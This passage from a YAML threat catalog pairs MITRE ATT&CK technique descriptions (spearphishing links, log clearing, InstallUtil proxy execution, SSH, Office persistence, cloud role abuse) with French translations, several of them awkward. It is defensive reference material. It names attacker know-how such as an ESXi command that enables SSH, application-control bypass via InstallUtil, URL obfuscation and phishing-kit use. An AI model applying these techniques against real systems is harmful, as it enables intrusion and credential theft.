          \ cibler les syst\xE8mes de ceux connus pour mener des recherches sur les\
          \ vuln\xE9rabilit\xE9s (y compris les fournisseurs commerciaux). La connaissance\
          \ d'une vuln\xE9rabilit\xE9 peut amener un adversaire \xE0 rechercher un\
          \ exploit existant (c'est-\xE0-dire [Exploits](https://attack.mitre.org/techniques/T1588/005))\
          \ ou \xE0 tenter d'en d\xE9velopper un lui-m\xEAme (c'est-\xE0-dire [Exploits](https://attack.mitre.org/techniques/T1587/004)).https\_\
          ://attack.mitre.org/techniques/T1588/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.002
    ref_id: T1566.002
    name: Spearphishing Link
    description: "Adversaries may send spearphishing emails with a malicious link\
      \ in an attempt to gain access to victim systems. Spearphishing with a link\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of links to download malware contained\
      \ in email, instead of attaching malicious files to the email itself, to avoid\
      \ defenses that may inspect email attachments. Spearphishing may also involve\
      \ social engineering techniques, such as posing as a trusted source.\n\nAll\
      \ forms of spearphishing are electronically delivered social engineering targeted\
      \ at a specific individual, company, or industry. In this case, the malicious\
      \ emails contain links. Generally, the links will be accompanied by social engineering\
      \ text and require the user to actively click or copy and paste a URL into a\
      \ browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204).\
      \ The visited website may compromise the web browser using an exploit, or the\
      \ user will be prompted to download applications, documents, zip files, or even\
      \ executables depending on the pretext for the email in the first place.\n\n\
      Adversaries may also include links that are intended to interact directly with\
      \ an email reader, including embedded images intended to exploit the end system\
      \ directly. Additionally, adversaries may use seemingly benign links that abuse\
      \ special characters to mimic legitimate websites (known as an \"IDN homograph\
      \ attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking\
      \ advantage of quirks in the URL schema, such as the acceptance of integer-\
      \ or hexadecimal-based hostname formats and the automatic discarding of text\
      \ before an \u201C@\u201D symbol: for example, `hxxp://google.com@1157586937`.(Citation:\
      \ Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform\
      \ consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s\
      \ that grant immediate access to the victim environment. For example, a user\
      \ may be lured into granting adversaries permissions/access via a malicious\
      \ OAuth 2.0 request URL that when accepted by the user provide permissions/access\
      \ for malicious applications.(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation:\
      \ Microsoft OAuth 2.0 Consent Phishing 2021) These stolen access tokens allow\
      \ the adversary to perform various actions on behalf of the user via API calls.(Citation:\
      \ Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may\
      \ also target device-based authorization, such as OAuth 2.0 device authorization\
      \ grant flow which is typically used to authenticate devices without UIs/browsers.\
      \ Known as \u201Cdevice code phishing,\u201D an adversary may send a link that\
      \ directs the victim to a malicious authorization page where the user is tricked\
      \ into entering a code/credentials that produces a device token.(Citation: SecureWorks\
      \ Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation:\
      \ Optiv Device Code Phishing 2021)\nhttps://attack.mitre.org/techniques/T1566/002"
    translations:
      fr:
        name: Lien Spearphishing
        description: "Les adversaires peuvent envoyer des e-mails de spearphishing\
          \ avec un lien malveillant dans le but d'acc\xE9der aux syst\xE8mes victimes.\
          \ Le spearphishing avec un lien est une variante sp\xE9cifique du spearphishing.\
          \ Il se distingue des autres formes de spearphishing en ce qu'il utilise\
          \ l'utilisation de liens pour t\xE9l\xE9charger des logiciels malveillants\
          \ contenus dans les e-mails, au lieu d'y attacher des fichiers malveillants,\
          \ afin d'\xE9viter les d\xE9fenses susceptibles d'inspecter les pi\xE8ces\
          \ jointes des e-mails. Le spearphishing peut \xE9galement impliquer des\
          \ techniques d'ing\xE9nierie sociale, comme se faire passer pour une source\
          \ fiable.\n\nToutes les formes de spearphishing sont des ing\xE9nieries\
          \ sociales \xE9lectroniques ciblant un individu, une entreprise ou un secteur\
          \ sp\xE9cifique. Dans ce cas, les emails malveillants contiennent des liens.\
          \ En g\xE9n\xE9ral, les liens sont accompagn\xE9s d'un texte d'ing\xE9nierie\
          \ sociale et exigent que l'utilisateur clique ou copier-colle activement\
          \ une URL dans un navigateur, en tirant parti de [User Execution](https://attack.mitre.org/techniques/T1204).\
          \ Le site visit\xE9 peut compromettre le navigateur web \xE0 l'aide d'une\
          \ faille, ou l'utilisateur sera invit\xE9 \xE0 t\xE9l\xE9charger des applications,\
          \ documents, fichiers zip, voire des ex\xE9cutables, selon le pr\xE9texte\
          \ de l'e-mail initial.\n\nLes adversaires peuvent \xE9galement inclure des\
          \ liens destin\xE9s \xE0 interagir directement avec un lecteur de messagerie,\
          \ y compris des images int\xE9gr\xE9es destin\xE9es \xE0 exploiter directement\
          \ le syst\xE8me final. De plus, les adversaires peuvent utiliser des liens\
          \ apparemment anodins qui abusent de caract\xE8res sp\xE9ciaux pour imiter\
          \ des sites web l\xE9gitimes (ce qu'on appelle \xAB attaque homographe IDN\
          \ \xBB). (Citation : CISA IDN ST05-016) Les URL peuvent aussi \xEAtre obscurcies\
          \ en profitant de particularit\xE9s du sch\xE9ma URL, telles que l'acceptation\
          \ de formats d'h\xF4tes bas\xE9s sur des noms entiers ou hexad\xE9cimaux\
          \ et la suppression automatique du texte avant un symbole \xAB @ \xBB :\
          \ par exemple, \xAB hxxp://google.com@1157586937 \xBB. (Citation : Mandiant\
          \ URL Obfuscation 2023)\n\nLes adversaires peuvent \xE9galement utiliser\
          \ des liens pour mener des campagnes de phishing/spearphishing par consentement\
          \ visant \xE0 [Voler le Token d'Acc\xE8s \xE0 l'Application](https://attack.mitre.org/techniques/T1528)\
          \ qui accordent un acc\xE8s imm\xE9diat \xE0 l'environnement de la victime.\
          \ Par exemple, un utilisateur peut \xEAtre attir\xE9 \xE0 accorder des permissions/acc\xE8\
          s \xE0 des adversaires via une URL de requ\xEAte OAuth 2.0 malveillante\
          \ qui, une fois accept\xE9e par l'utilisateur, fournit des permissions/acc\xE8\
          s aux applications malveillantes. (Citation : Trend Micro Pawn Storm OAuth\
          \ 2017)(Citation : Microsoft OAuth 2.0 Consent Phishing 2021) Ces jetons\
          \ d'acc\xE8s vol\xE9s permettent \xE0 l'adversaire d'effectuer diverses\
          \ actions au nom de l'utilisateur via des appels API. (Citation : Microsoft\
          \ OAuth 2.0 Consent Phishing 2021)\n\nDe m\xEAme, des liens malveillants\
          \ peuvent \xE9galement cibler des autorisations bas\xE9es sur un appareil,\
          \ comme le flux d'autorisation d'autorisation OAuth 2.0 qui est g\xE9n\xE9\
          ralement utilis\xE9 pour authentifier des appareils sans interface utilisateur/navigateur.\
          \ Appel\xE9 \xAB device code phishing \xBB, un adversaire peut envoyer un\
          \ lien dirigeant la victime vers une page d'autorisation malveillante o\xF9\
          \ l'utilisateur est tromp\xE9 en saisissant un code/identifiants g\xE9n\xE9\
          rant un jeton d'appareil. (Citation : Phishing sur le code des appareils\
          \ SecureWorks 2021)(Citation : Phishing sur le code de dispositif Netskope\
          \ 2021)(Citation : Phishing par code de dispositif Optiv 2021) https://attack.mitre.org/techniques/T1566/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.002
    ref_id: T1070.002
    name: Clear Linux or Mac System Logs
    description: 'Adversaries may clear system logs to hide evidence of an intrusion.
      macOS and Linux both keep track of system or user-initiated actions via system
      logs. The majority of native system logging is stored under the <code>/var/log/</code>
      directory. Subfolders in this directory categorize logs by their related functions,
      such as:(Citation: Linux Logs)


      * <code>/var/log/messages:</code>: General and system-related messages

      * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication
      logs

      * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records

      * <code>/var/log/kern.log</code>: Kernel logs

      * <code>/var/log/cron.log</code>: Crond logs

      * <code>/var/log/maillog</code>: Mail server logs

      * <code>/var/log/httpd/</code>: Web server access and error logs

      https://attack.mitre.org/techniques/T1070/002'
    translations:
      fr:
        name: "Effacer les journaux syst\xE8me Linux ou Mac"
        description: "Les adversaires peuvent effacer les journaux syst\xE8me pour\
          \ masquer des preuves d'intrusion. macOS et Linux suivent tous deux les\
          \ actions initi\xE9es par le syst\xE8me ou par l'utilisateur via les journaux\
          \ syst\xE8me. La majorit\xE9 des logs natifs du syst\xE8me sont stock\xE9\
          s dans le r\xE9pertoire <code>/var/log/</code>. Les sous-dossiers de ce\
          \ r\xE9pertoire cat\xE9gorisent les journaux selon leurs fonctions associ\xE9\
          es, telles que : (Citation : Linux Logs)\n\n* <code>/var/log/messages\_\
          :</code> : messages g\xE9n\xE9raux et li\xE9s au syst\xE8me* <code>/var/log/secure</code>\
          \ ou <code>/var/log/auth.log</code> : logs d'authentification* <code>/var/log/utmp</code>\
          \ ou <code>/var/log/wtmp</code> :  Enregistrements de connexion* <code>/var/log/kern.log</code>\
          \ : Journaux du noyau* <code>/var/log/cron.log</code> : Journaux de crond*\
          \ <code>/var/log/journal mail</code> : Journaux du serveur de messagerie*\
          \ <code>/var/log/httpd/</code> : Acc\xE8s au serveur Web et logshttps://attack.mitre.org/techniques/T1070/002\
          \ d'erreur"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.004
    ref_id: T1499.004
    name: Application or System Exploitation
    description: 'Adversaries may exploit software vulnerabilities that can cause
      an application or system to crash and deny availability to users. (Citation:
      Sucuri BIND9 August 2015) Some systems may automatically restart critical applications
      and services when crashes occur, but they can likely be re-exploited to cause
      a persistent denial of service (DoS) condition.


      Adversaries may exploit known or zero-day vulnerabilities to crash applications
      and/or systems, which may also lead to dependent applications and/or systems
      to be in a DoS condition. Crashed or restarted applications or systems may also
      have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485),
      [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489)
      etc. which may further cause a DoS condition and deny availability to critical
      information, applications and/or systems.

      https://attack.mitre.org/techniques/T1499/004'
    translations:
      fr:
        name: "Exploitation d'applications ou de syst\xE8mes"
        description: "Les adversaires peuvent exploiter des vuln\xE9rabilit\xE9s logicielles\
          \ qui peuvent provoquer un plantage d'une application ou d'un syst\xE8me\
          \ et priver la disponibilit\xE9 des utilisateurs. (Citation : Sucuri BIND9\
          \ ao\xFBt 2015) Certains syst\xE8mes peuvent red\xE9marrer automatiquement\
          \ des applications et services critiques en cas de plantage, mais ils peuvent\
          \ probablement \xEAtre r\xE9exploit\xE9s pour provoquer une condition de\
          \ d\xE9ni de service persistant (DoS).\n\nLes adversaires peuvent exploiter\
          \ des vuln\xE9rabilit\xE9s connues ou zero-day pour planter des applications\
          \ et/ou des syst\xE8mes, ce qui peut \xE9galement conduire \xE0 des applications\
          \ et/ou syst\xE8mes d\xE9pendants en \xE9tat DoS. Des applications ou syst\xE8\
          mes plant\xE9s ou red\xE9marr\xE9s peuvent \xE9galement avoir d'autres effets\
          \ tels que [Destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485),\
          \ [Corruption du firmware](https://attack.mitre.org/techniques/T1495), [Service\
          \ Stop](https://attack.mitre.org/techniques/T1489), etc., ce qui peut aggraver\
          \ une condition DoS et refuser la disponibilit\xE9 des informations, applications\
          \ et/ou syst\xE8mes critiques.https\_://attack.mitre.org/techniques/T1499/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137
    ref_id: T1137
    name: Office Application Startup
    description: 'Adversaries may leverage Microsoft Office-based applications for
      persistence between startups. Microsoft Office is a fairly common application
      suite on Windows-based operating systems within an enterprise network. There
      are multiple mechanisms that can be used with Office for persistence when an
      Office-based application is started; this can include the use of Office Template
      Macros and add-ins.


      A variety of features have been discovered in Outlook that can be abused to
      obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost
      Ruler GitHub) These persistence mechanisms can work within Outlook or be used
      through Office 365.(Citation: TechNet O365 Outlook Rules)

      https://attack.mitre.org/techniques/T1137'
    translations:
      fr:
        name: "D\xE9marrage d'applications Office"
        description: "Les adversaires peuvent tirer parti des applications bas\xE9\
          es sur Microsoft Office pour assurer la persistance entre les startups.\
          \ Microsoft Office est une suite d'applications assez courante sur les syst\xE8\
          mes d'exploitation Windows au sein d'un r\xE9seau d'entreprise. Il existe\
          \ plusieurs m\xE9canismes pouvant \xEAtre utilis\xE9s avec Office pour la\
          \ persistance lors du d\xE9marrage d'une application bas\xE9e sur Office\
          \ ; cela peut inclure l'utilisation de macros de mod\xE8les Office et d'extensions.\n\
          \nUne vari\xE9t\xE9 de fonctionnalit\xE9s ont \xE9t\xE9 d\xE9couvertes dans\
          \ Outlook qui peuvent \xEAtre exploit\xE9es pour obtenir de la persistance,\
          \ telles que les r\xE8gles Outlook, les formulaires et la page d'accueil.\
          \ (Citation : GitHub de la r\xE8gle SensePost) Ces m\xE9canismes de persistance\
          \ peuvent fonctionner dans Outlook ou \xEAtre utilis\xE9s via Office 365.\
          \ (Citation : R\xE8gles Outlook TechNet O365)https://attack.mitre.org/techniques/T1137"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.004
    ref_id: T1218.004
    name: InstallUtil
    description: 'Adversaries may use InstallUtil to proxy execution of code through
      a trusted Windows utility. InstallUtil is a command-line utility that allows
      for installation and uninstallation of resources by executing specific installer
      components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil
      binary may also be digitally signed by Microsoft and located in the .NET directories
      on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code>
      and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.


      InstallUtil may also be used to bypass application control through use of attributes
      within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.
      (Citation: LOLBAS Installutil)

      https://attack.mitre.org/techniques/T1218/004'
    translations:
      fr:
        name: InstallUtil
        description: "Les adversaires peuvent utiliser InstallUtil pour proxy l'ex\xE9\
          cution du code via un utilitaire Windows de confiance. InstallUtil est un\
          \ utilitaire en ligne de commande qui permet l'installation et la d\xE9\
          sinstallation de ressources en ex\xE9cutant des composants sp\xE9cifiques\
          \ de l'installateur sp\xE9cifi\xE9s dans des binaires .NET. (Citation :\
          \ MSDN InstallUtil) Le binaire InstallUtil peut \xE9galement \xEAtre sign\xE9\
          \ num\xE9riquement par Microsoft et se trouver dans les r\xE9pertoires .NET\
          \ d'un syst\xE8me Windows : <code>C\_:\\Windows\\Microsoft.NET\\Framework\\\
          v<version>\\InstallUtil.exe</code> et <code>C\_:\\Windows\\Microsoft.NET\\\
          Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil peut \xE9\
          galement \xEAtre utilis\xE9 pour contourner le contr\xF4le des applications\
          \ en utilisant des attributs dans le binaire qui ex\xE9cutent la classe\
          \ d\xE9cor\xE9e de l'attribut <code>[System.ComponentModel.RunInstaller(true)]</code>.\
          \ (Citation : LOLBAS Installutil)https://attack.mitre.org/techniques/T1218/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.003
    ref_id: T1598.003
    name: Spearphishing Link
    description: "Adversaries may send spearphishing messages with a malicious link\
      \ to elicit sensitive information that can be used during targeting. Spearphishing\
      \ for information is an attempt to trick targets into divulging information,\
      \ frequently credentials or other actionable information. Spearphishing for\
      \ information frequently involves social engineering techniques, such as posing\
      \ as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or\
      \ sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing\
      \ are electronically delivered social engineering targeted at a specific individual,\
      \ company, or industry. In this scenario, the malicious emails contain links\
      \ generally accompanied by social engineering text to coax the user to actively\
      \ click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation:\
      \ PCMag FakeLogin) The given website may be a clone of a legitimate site (such\
      \ as an online or corporate login portal) or may closely resemble a legitimate\
      \ site in appearance and have a URL containing elements from the real site.\
      \ URLs may also be obfuscated by taking advantage of quirks in the URL schema,\
      \ such as the acceptance of integer- or hexadecimal-based hostname formats and\
      \ the automatic discarding of text before an \u201C@\u201D symbol: for example,\
      \ `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\
      \nAdversaries may also embed \u201Ctracking pixels,\u201D \"web bugs,\" or \"\
      web beacons\" within phishing messages to verify the receipt of an email, while\
      \ also potentially profiling and tracking victim information such as IP address.(Citation:\
      \ NIST Web Bug)(Citation: Ryte Wiki) These mechanisms often appear as small\
      \ images (typically one pixel in size) or otherwise obfuscated objects and are\
      \ typically delivered as HTML code containing a link to a remote server.(Citation:\
      \ Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete\
      \ website using what is known as a \"browser-in-the-browser\" (BitB) attack.\
      \ By generating a fake browser popup window with an HTML-based address bar that\
      \ appears to contain a legitimate URL (such as an authentication portal), they\
      \ may be able to prompt users to enter their credentials while bypassing typical\
      \ URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB\
      \ 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2`\
      \ to perform adversary-in-the-middle phishing by proxying the connection between\
      \ the victim and the legitimate website. On a successful login, the victim is\
      \ redirected to the legitimate website, while the adversary captures their session\
      \ cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539))\
      \ in addition to their username and password. This may enable the adversary\
      \ to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation:\
      \ Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in\
      \ the form of Quick Response (QR) Codes (also known as \u201Cquishing\u201D\
      ). These links may direct a victim to a credential phishing page.(Citation:\
      \ QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in\
      \ the email and may thus go undetected by most automated email security scans.(Citation:\
      \ qr-phish-agriculture) These QR codes may be scanned by or delivered directly\
      \  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)),\
      \ which may be less secure in several relevant ways.(Citation: qr-phish-agriculture)\
      \ For example, mobile users may not be able to notice minor differences between\
      \ genuine and credential harvesting websites due to mobile\u2019s smaller form\
      \ factor.\n\nFrom the fake website, information is gathered in web forms and\
      \ sent to the adversary. Adversaries may also use information from previous\
      \ reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))\
      \ to craft persuasive and believable lures.\nhttps://attack.mitre.org/techniques/T1598/003"
    translations:
      fr:
        name: Lien Spearphishing
        description: "Les adversaires peuvent envoyer des messages de spearphishing\
          \ avec un lien malveillant afin d'obtenir des informations sensibles pouvant\
          \ \xEAtre utilis\xE9es lors du ciblage. Le spearphishing pour obtenir des\
          \ informations est une tentative de tromper les cibles pour qu'elles divulguent\
          \ des informations, souvent des identifiants ou d'autres informations exploitables.\
          \ Le spearphishing pour obtenir des informations implique souvent des techniques\
          \ d'ing\xE9nierie sociale, comme se faire passer pour une source ayant une\
          \ raison de collecter des informations (par exemple : [\xC9tablir des comptes](https://attack.mitre.org/techniques/T1585)\
          \ ou [Compromettre des comptes](https://attack.mitre.org/techniques/T1586))\
          \ et/ou envoyer plusieurs messages apparemment urgents.\n\nToutes les formes\
          \ de spearphishing sont des ing\xE9nieries sociales \xE9lectroniques ciblant\
          \ un individu, une entreprise ou un secteur sp\xE9cifique. Dans ce cas,\
          \ les emails malveillants contiennent g\xE9n\xE9ralement des liens accompagn\xE9\
          s de texte d'ing\xE9nierie sociale pour inciter l'utilisateur \xE0 cliquer\
          \ ou copier-coller une URL dans un navigateur. (Citation : Phishing de TrendMictro)(Citation\
          \ : PCMag FakeLogin) Le site web concern\xE9 peut \xEAtre un clone d'un\
          \ site l\xE9gitime (comme un portail de connexion en ligne ou d'entreprise)\
          \ ou ressembler fortement \xE0 un site l\xE9gitime en apparence et comporter\
          \ une URL contenant des \xE9l\xE9ments du site r\xE9el. Les URL peuvent\
          \ aussi \xEAtre obscurcies en profitant de particularit\xE9s du sch\xE9\
          ma URL, telles que l'acceptation de formats d'h\xF4tes bas\xE9s sur des\
          \ noms entiers ou hexad\xE9cimaux et la suppression automatique du texte\
          \ avant un symbole \xAB @ \xBB : par exemple, \xAB hxxp://google.com@1157586937\
          \ \xBB. (Citation : Mandiant URL Obfuscation 2023)\n\nLes adversaires peuvent\
          \ \xE9galement int\xE9grer des \xAB pixels de suivi \xBB, des \xAB insectes\
          \ web \xBB ou des \xAB balises web \xBB dans les messages de phishing pour\
          \ v\xE9rifier la r\xE9ception d'un e-mail, tout en profilant et en suivant\
          \ potentiellement les informations des victimes telles que l'adresse IP.\
          \ (Citation : Bug Web du NIST)(Citation : Ryte Wiki) Ces m\xE9canismes apparaissent\
          \ souvent sous forme de petites images (g\xE9n\xE9ralement d'un pixel de\
          \ taille) ou d'objets obscurciss\xE9s et sont g\xE9n\xE9ralement livr\xE9\
          s sous forme de code HTML contenant un lien vers un serveur distant. (Citation\
          \ : Ryte Wiki)(Citation : IAPP)\n\nLes adversaires peuvent \xE9galement\
          \ \xEAtre capables de falsifier un site web complet en utilisant ce qu'on\
          \ appelle une attaque \xAB browser-in-the-browser \xBB (BitB). En g\xE9\
          n\xE9rant une fausse fen\xEAtre contextuelle de navigateur avec une barre\
          \ d'adresses HTML qui semble contenir une URL l\xE9gitime (comme un portail\
          \ d'authentification), ils peuvent \xEAtre en mesure d'inviter les utilisateurs\
          \ \xE0 saisir leurs identifiants tout en contournant les m\xE9thodes habituelles\
          \ de v\xE9rification des URL. (Citation : ZScaler BitB 2020)(Citation :\
          \ Mr. D0x BitB 2022)\n\nLes adversaires peuvent utiliser des kits de phishing\
          \ tels que \xAB EvilProxy \xBB et \xAB Evilginx2 \xBB pour effectuer un\
          \ phishing adversaire du milieu en proxy la connexion entre la victime et\
          \ le site web l\xE9gitime. Lors d'une connexion r\xE9ussie, la victime est\
          \ redirig\xE9e vers le site l\xE9gitime, tandis que l'adversaire capture\
          \ son cookie de session (c'est-\xE0-dire [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539))\
          \ en plus de son nom d'utilisateur et de son mot de passe. Cela peut permettre\
          \ \xE0 l'adversaire de contourner ensuite la MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).\
          \ (Citation : Proofpoint Human Factor)\n\nLes adversaires peuvent \xE9galement\
          \ envoyer un lien malveillant sous forme de codes de r\xE9ponse rapide (QR)\
          \ (\xE9galement appel\xE9s \xAB quishing \xBB). Ces liens peuvent diriger\
          \ une victime vers une page de phishing li\xE9e aux accr\xE9ditations. (Citation\
          \ : QR-campaign-energy-firm) En utilisant un code QR, l'URL peut ne pas\
          \ \xEAtre expos\xE9e dans l'email et peut ainsi passer inaper\xE7ue par\
          \ la plupart des scans automatis\xE9s de s\xE9curit\xE9 des e-mails. (Citation\
          \ : qr-phish-agriculture) Ces QR codes peuvent \xEAtre scann\xE9s ou livr\xE9\
          s directement sur l'appareil mobile de l'utilisateur (par exemple, [Phishing](https://attack.mitre.org/techniques/T1660)),\
          \ ce qui peut \xEAtre moins s\xE9curis\xE9 \xE0 plusieurs \xE9gards pertinents.\
          \ (Citation : qr-phish-agriculture) Par exemple, les utilisateurs mobiles\
          \ peuvent ne pas \xEAtre capables de remarquer les diff\xE9rences mineures\
          \ entre les sites de collecte de v\xE9ritables et les sites de collecte\
          \ d'identifiants en raison du format plus petit du mobile.\n\nDepuis le\
          \ faux site web, les informations sont collect\xE9es sous forme de formulaires\
          \ web et envoy\xE9es \xE0 l'adversaire. Les adversaires peuvent \xE9galement\
          \ utiliser des informations issues d'efforts de reconnaissance ant\xE9rieurs\
          \ (ex : [Rechercher des sites web ouverts/domaines](https://attack.mitre.org/techniques/T1593)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594))\
          \ pour cr\xE9er des leurres convaincants et cr\xE9dibles.https\_://attack.mitre.org/techniques/T1598/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.004
    ref_id: T1021.004
    name: SSH
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into remote machines using Secure Shell (SSH). The adversary may then\
      \ perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized\
      \ users to open remote shells on other computers. Many Linux and macOS versions\
      \ come with SSH installed by default, although typically disabled until the\
      \ user enables it. On ESXi, SSH can be enabled either directly on the host (e.g.,\
      \ via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware\
      \ 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker\
      \ 2025) The SSH server can be configured to use standard password authentication\
      \ or public-private keypairs in lieu of or in addition to a password. In this\
      \ authentication scenario, the user\u2019s public key must be in a special file\
      \ on the computer running the server that lists which keypairs are allowed to\
      \ login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).\n\
      https://attack.mitre.org/techniques/T1021/004"
    translations:
      fr:
        name: SSH
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour se connecter \xE0 des machines distantes via Secure Shell (SSH).\
          \ L'adversaire peut alors effectuer des actions en tant qu'utilisateur connect\xE9\
          .\n\nSSH est un protocole qui permet aux utilisateurs autoris\xE9s d'ouvrir\
          \ des shells \xE0 distance sur d'autres ordinateurs. De nombreuses versions\
          \ de Linux et macOS sont livr\xE9es avec SSH install\xE9 par d\xE9faut,\
          \ bien que g\xE9n\xE9ralement d\xE9sactiv\xE9 jusqu'\xE0 ce que l'utilisateur\
          \ l'active. Sur ESXi, le SSH peut \xEAtre activ\xE9 directement sur l'h\xF4\
          te (par exemple, via 'vim-cmd hostsvc/enable_ssh'), soit via vCenter. (Citation\
          \ : Sygnia ESXi Ransomware 2025)(Citation : Ransomware TrendMicro ESXI)(Citation\
          \ : Sygnia Abyss Locker 2025) Le serveur SSH peut \xEAtre configur\xE9 pour\
          \ utiliser une authentification par mot de passe standard ou des paires\
          \ de cl\xE9s public-priv\xE9 en remplacement ou en compl\xE9ment d'un mot\
          \ de passe. Dans ce sc\xE9nario d'authentification, la cl\xE9 publique de\
          \ l'utilisateur doit se trouver dans un fichier sp\xE9cial sur l'ordinateur\
          \ ex\xE9cutant le serveur qui liste quelles paires de cl\xE9s sont autoris\xE9\
          es \xE0 se connecter en tant qu'utilisateur (c'est-\xE0-dire [SSH Authorized\
          \ Keys](https://attack.mitre.org/techniques/T1098/004)).https\_://attack.mitre.org/techniques/T1021/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.003
    ref_id: T1098.003
    name: Additional Cloud Roles
    description: "An adversary may add additional roles or permissions to an adversary-controlled\
      \ cloud account to maintain persistent access to a tenant. For example, adversaries\
      \ may update IAM policies in cloud-based environments or add a new global administrator\
      \ in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation:\
      \ Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin,\
      \ October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions,\
      \ a compromised account can gain almost unlimited access to data and settings\
      \ (including the ability to reset the passwords of other admins).(Citation:\
      \ Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account\
      \ modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or other malicious account activity. Adversaries may also modify existing\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have\
      \ compromised. This could lead to privilege escalation, particularly if the\
      \ roles added allow for lateral movement to additional accounts.\n\nFor example,\
      \ in AWS environments, an adversary with appropriate permissions may be able\
      \ to use the <code>CreatePolicyVersion</code> API to define a new version of\
      \ an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy\
      \ with additional or distinct permissions to a compromised user account.(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries\
      \ may add roles to adversary-controlled accounts outside the victim cloud tenant.\
      \ This allows these external accounts to perform actions inside the victim tenant\
      \ without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)\n\
      https://attack.mitre.org/techniques/T1098/003"
    translations:
      fr:
        name: "Postes Cloud suppl\xE9mentaires"
        description: "Un adversaire peut ajouter des r\xF4les ou des autorisations\
          \ suppl\xE9mentaires \xE0 un compte cloud contr\xF4l\xE9 par l'adversaire\
          \ afin de maintenir un acc\xE8s persistant \xE0 un locataire. Par exemple,\
          \ les adversaires peuvent mettre \xE0 jour les politiques IAM dans des environnements\
          \ cloud ou ajouter un nouvel administrateur global dans les environnements\
          \ Office 365. (Citation : Politiques et permissions AWS IAM)(Citation :\
          \ Politiques IAM de Google Cloud)(Citation : Soutien Microsoft O365 Ajouter\
          \ un autre admin, octobre 2019)(Citation : R\xF4les d'administrateur Microsoft\
          \ O365) Avec suffisamment de permissions, un compte compromis peut obtenir\
          \ un acc\xE8s quasi illimit\xE9 aux donn\xE9es et aux param\xE8tres (y compris\
          \ la possibilit\xE9 de r\xE9initialiser les mots de passe d'autres administrateurs).\
          \ (Citation : Expulser l'attaquant AWS)(Citation : R\xF4les d'administrateur\
          \ Microsoft O365) \n\nCette modification de compte peut imm\xE9diatement\
          \ suivre [Cr\xE9er un compte](https://attack.mitre.org/techniques/T1136)\
          \ ou toute autre activit\xE9 malveillante du compte. Les adversaires peuvent\
          \ \xE9galement modifier les [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ existants qu'ils ont compromis. Cela pourrait entra\xEEner une escalade\
          \ des privil\xE8ges, en particulier si les r\xF4les ajout\xE9s permettent\
          \ un transfert lat\xE9ral vers des comptes suppl\xE9mentaires.\n\nPar exemple,\
